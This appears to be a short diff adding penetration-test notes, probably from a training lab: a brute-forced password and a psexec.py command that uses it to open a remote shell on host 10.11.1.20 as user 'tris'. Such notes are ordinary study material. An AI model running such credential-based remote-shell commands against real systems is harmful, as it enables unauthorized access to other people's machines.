@@ -1,0 +1,5 @@
+bruteforce
+
+password: ThisIsTheUsersPassword22
+
+psexec.py tris:ThisIsTheUsersPassword22@10.11.1.20
